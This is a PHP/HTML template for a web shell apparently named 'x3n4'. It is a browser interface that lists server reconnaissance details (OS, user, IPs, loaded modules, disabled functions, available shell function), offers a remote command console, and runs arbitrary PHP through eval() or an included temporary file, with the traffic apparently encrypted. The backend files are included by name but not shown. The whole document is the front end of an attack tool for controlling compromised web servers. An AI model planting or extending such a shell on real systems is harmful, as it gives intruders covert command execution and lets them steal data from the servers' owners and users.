<?php include('x3n4.core.php'); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>x3n4 <?php echo X3N4_VERSION; ?></title>

    <!-- Bootstrap -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    <?php readfile('x3n4.css'); ?>
    </style>
</head>
<body>
    <div class="container">
        <h1 class="page-header">
            <span class="pull-right label label-<?php echo ini_get('safe_mode') ? 'success' : 'danger'; ?>">safe_mode <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></span>
            x3n4 <?php echo X3N4_VERSION; ?>
        </h1>

        <ul class="nav nav-tabs" role="tablist">
            <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
            <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
            <li role="presentation"><a href="#php-eval" aria-controls="php-eval" role="tab" data-toggle="tab"><i class="fa fa-code"></i> eval()</a></li>
        </ul>
        <p></p>
        <div class="tab-content">
            <div id="information" role="tabpanel" class="tab-pane table-responsive">
                <table class="table">
                    <tr>
                        <td>System:</td>
                        <td>
                            <?php
                            switch (PHP_OS) {
                                case 'Linux':
                                    $platform_icon = 'fa-linux';
                                    break;
                                case 'WINNT':
                                    $platform_icon = 'fa-windows';
                                    break;
                                case 'Darwin':
                                    $platform_icon = 'fa-osx';
                                    break;
                                default:
                                    $platform_icon = 'fa-unknown';
                            }
                            ?>
                            <i class="fa <?php echo $platform_icon; ?>"></i> <?php echo php_uname(); ?>
                        </td>
                    </tr>
                    <tr>
                        <td>Current user:</td>
                        <td><?php echo get_user(); ?></td>
                    </tr>
                    <tr>
                        <td>Server IP:</td>
                        <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Server Name:</td>
                        <td><?php echo $_SERVER['SERVER_NAME']; ?></td>
                    </tr>
                    <tr>
                        <td>Server Sofware:</td>
                        <td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td>
                    </tr>
                    <tr>
                        <td>PHP Version:</td>
                        <td><?php echo phpversion(); ?></td>
                    </tr>
                    <tr>
                        <td>Client IP:</td>
                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
                    </tr>
                    <tr>
                        <td>Installed modules:</td>
                        <td><?php echo implode(', ', get_loaded_extensions()); ?></td>
                    </tr>
                    <tr>
                        <td>Disabled functions:</td>
                        <td><?php echo implode(', ', disabled_functions()); ?></td>
                    </tr>
                    <tr>
                        <td>Shell function:</td>
                        <td><?php echo get_shell_command(); ?></td>
                    </tr>
                </table>
            </div>

            <div id="console" role="tabpanel" class="tab-pane active">
                <pre id="stdout"><?php echo get_motd() . PHP_EOL; ?></pre>
                <div class="form-group">
                    <div class="input-group">
                        <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
                        <input type="text" id="stdin" class="form-control" />
                        <span class="input-group-btn">
                            <button type="button" class="btn btn-default" id="btnExecCommand"><i class="fa fa-chevron-right"></i> Send</button>
                        </span>
                    </div>
                </div>
            </div>

            <div id="php-eval" role="tabpanel" class="tab-pane">
                <textarea id="php-code" class="form-control"><?php echo '//<?php

// place your code here
echo \'hello world\';'; ?></textarea>
                <div class="row">
                    <div class="col-sm-6">
                        <p id="eval-time-took"></p>
                    </div>
                    <div class="col-sm-6 text-right">
                        <div class="form-inline">
                            <div class="form-group">
                                <label class="visible-xs" for="eval-mechanism">Execution mechanism</label>
                                <select class="form-control" id="eval-mechanism" data-toggle="tooltip" title="Select the execution mechanism">
                                    <option value="auto" selected>auto</option>
                                    <option value="eval">eval()</option>
                                    <option value="tempfile">write and include temporary file</option>
                                </select>
                            </div>
                            <button type="button" class="btn btn-default" id="btnEval"><i class="fa fa-play"></i> Run</button>
                        </div>
                    </div>
                </div>
                <pre id="php-stdout"></pre>
            </div>
        </div>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.2.8/ace.js"></script>
    <script>
        window.editorPhp = ace.edit('php-code');
        window.editorPhp.setTheme('ace/theme/monokai');
        window.editorPhp.getSession().setMode('ace/mode/php');
        window.editorPhp.getSession().setUseWrapMode(true);
        window.editorPhp.resize(true);
    </script>
    <script>
    <?php readfile('x3n4.js'); ?>
    </script>
    <script>
    window.x3n4 = new x3n4({
      'version': '<?php echo X3N4_VERSION; ?>',
      'script_path': '<?php echo $_SERVER['REQUEST_URI']; ?>',
      'algo': '<?php echo X3N4_ENCRYPTION_ALGORITHM; ?>'
    });
    window.x3n4.declareCallbacks();
    window.x3n4.checkUpdate();
    </script>
</body>
</html>
